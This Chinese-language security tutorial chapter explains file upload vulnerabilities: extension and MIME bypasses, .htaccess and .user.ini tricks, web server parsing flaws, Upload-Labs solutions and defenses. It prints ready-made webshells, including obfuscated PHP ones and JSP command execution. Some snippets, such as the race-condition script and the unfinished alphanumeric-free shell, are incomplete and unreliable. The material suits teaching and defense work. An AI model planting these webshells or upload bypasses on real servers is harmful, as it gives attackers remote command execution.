# Chapter 6: 文件上传漏洞

## 6.1 文件上传漏洞简介

文件上传漏洞是指 Web 应用对用户上传的文件没有进行严格的验证和过滤，导致攻击者上传恶意文件（如 WebShell）并执行。

## 6.2 文件上传原理

1. Web 应用提供文件上传功能
2. 服务器对上传文件校验不严格
3. 攻击者上传恶意文件（.php, .asp, .jsp 等）
4. 访问上传的恶意文件，代码在服务器端执行

## 6.3 文件上传检测

### 6.3.1 常见上传点

- 头像上传
- 附件上传
- 文章配图
- 简历上传
- 邮件附件

### 6.3.2 检测方法

1. 尝试上传正常文件
2. 尝试上传恶意文件
3. 检查服务器响应
4. 绕过防护措施

## 6.4 常见上传绕过技术

### 6.4.1 前端绕过

```javascript
// 禁用 JavaScript 上传验证
// 修改 HTML 表单
// 抓包修改文件类型
```

**绕过方法：**
1. 禁用浏览器 JavaScript
2. 使用 Burp Suite 抓包修改
3. 恶意文件后改为允许的类型

### 6.4.2 MIME 类型绕过

**Content-Type 常见值：**
```
image/jpeg - JPG
image/png - PNG
image/gif - GIF
text/plain - TXT
application/pdf - PDF
```

**绕过方法：**
```bash
# 修改 Content-Type
Content-Type: image/jpeg
```

### 6.4.3 文件名绕过

| 方法 | 示例 |
|------|------|
| 空格绕过 | `shell.php .jpg` |
| 点号绕过 | `shell.php.jpg` |
| 大小写 | `shell.PhP` |
| %00 截断 | `shell.php%00.jpg` |
| 0x00 截断 | `shell.php\x00.jpg` |
| 解析漏洞 | `shell.jpg/.php` |
| 双后缀 | `shell.php.jpg` |

### 6.4.4 .htaccess 绕过

```apache
# 上传 .htaccess 文件
AddType application/x-httpd-php .png

# 然后上传 png 文件，内容为 PHP 代码
```

### 6.4.5 .user.ini 绕过

```ini
# 上传 .user.ini
auto_prepend_file=shell.png

# 上传 shell.png
<?php eval($_POST['cmd']); ?>
```

### 6.4.6 解析漏洞

**Apache 解析漏洞：**
```
shell.php.rar # 不识别，按 PHP 执行
shell.php.jpg # 识别为 PHP
```

**Nginx 解析漏洞：**
```
shell.jpg%00.php
shell.jpg/%00.php
```

**IIS 解析漏洞：**
```
shell.asp;jpg
shell.php;.jpg
```

### 6.4.7 竞争条件上传

利用文件上传和删除的时间差：

```python
import requests

while True:
    requests.post('http://target.com/upload', files={'file': 'shell.php'})
    requests.get('http://target.com/uploads/shell.php')
```

## 6.5 WebShell

### 6.5.1 简单 PHP WebShell

```php
<?php @eval($_POST['cmd']); ?>
```

### 6.5.2 隐藏 WebShell

```php
<?php
$a = $_POST['cmd'];
$b = base64_decode('c3lzdGVt');
$b($a);
?>
# 解码后为 system
```

### 6.5.3 变形 WebShell

```php
<?php
$_='sys'.'tem';
$_($_POST['cmd']);
?>
```

### 6.5.4 中文 WebShell

```php
<?php
$🐟='assert';
$🐟($_POST['cmd']);
?>
```

### 6.5.5 无字母数字 WebShell

```php
<?php
$_=[];
$_=@"$_"; // Array
$__=$_['z'.'']; // null
$___=$__; // null
?>
```

### 6.5.6 一句话木马

**ASP：**
```asp
<%eval request("cmd")%>
```

**ASPX：**
```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
```

**JSP：**
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

## 6.6 文件上传攻击工具

### 6.6.1 Burp Suite

1. 抓取上传请求
2. 修改文件名、MIME 类型
3. 尝试各种绕过

### 6.6.2 Upload-Labs 靶场

**Pass-01 (前端绕过)**
```javascript
// 禁用 JavaScript 或抓包修改
```

**Pass-02 (MIME 绕过)**
```bash
Content-Type: image/jpeg
```

**Pass-03 (黑名单绕过)**
```bash
# 上传 phtml, php3, php4, pht
shell.php3
```

**Pass-04 (.htaccess 绕过)**
```bash
# 上传 .htaccess
AddType application/x-httpd-php .png

# 上传 shell.png
```

**Pass-05 (大小写绕过)**
```bash
shell.PhP
```

**Pass-06 (空格绕过)**
```bash
shell.php (末尾空格)
```

**Pass-07 (点号绕过)**
```bash
shell.php.
```

**Pass-08 (::$DATA 绕过)**
```bash
shell.php::$DATA
```

**Pass-09 (点空格点绕过)**
```bash
shell.php.
```

**Pass-10 (双写绕过)**
```bash
shell.phphp
```

## 6.7 文件上传防御

### 6.7.1 白名单验证

```php
$allowed_ext = ['jpg', 'png', 'gif'];
$file_ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($file_ext, $allowed_ext)) {
    die('不允许的上传类型');
}
```

### 6.7.2 文件重命名

```php
$new_name = md5(time() . rand()) . '.' . $file_ext;
```

### 6.7.3 文件内容检测

```php
$content = file_get_contents($_FILES['file']['tmp_name']);
if (strpos($content, '<?php') !== false) {
    die('文件包含恶意代码');
}
```

### 6.7.4 文件头检测

```php
$allowed = ['jpeg' => 'ffd8ffe0', 'png' => '89504e47'];
$file = fopen($_FILES['file']['tmp_name'], 'rb');
$header = fread($file, 4);
fclose($file);
```

### 6.7.5 禁止上传可执行文件

- 禁止 .php, .asp, .jsp, .exe 等
- 使用独立的存储域名

### 6.7.6 上传目录禁止执行

```apache
# .htaccess
php_flag engine off
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>
```

### 6.7.7 防御总结

| 防御措施 | 说明 |
|----------|------|
| 白名单验证 | 只允许安全的文件类型 |
| 文件重命名 | 防止文件名攻击 |
| 内容检测 | 检测恶意代码 |
| 文件头检测 | 验证文件真实类型 |
| 独立存储 | 上传文件与 Web 目录分离 |
| 目录权限 | 上传目录禁止执行 |
| WAF | 额外防护 |

## 6.8 文件上传攻击流程

1. **信息收集**
   - 确定上传点
   - 了解服务器类型
   - 识别安全防护

2. **尝试上传**
   - 测试正常文件
   - 测试恶意文件
   - 分析错误信息

3. **绕过防护**
   - 前端绕过
   - MIME 绕过
   - 文件名绕过
   - 解析漏洞

4. **获取 Shell**
   - 访问上传文件
   - 执行命令
   - 维持权限
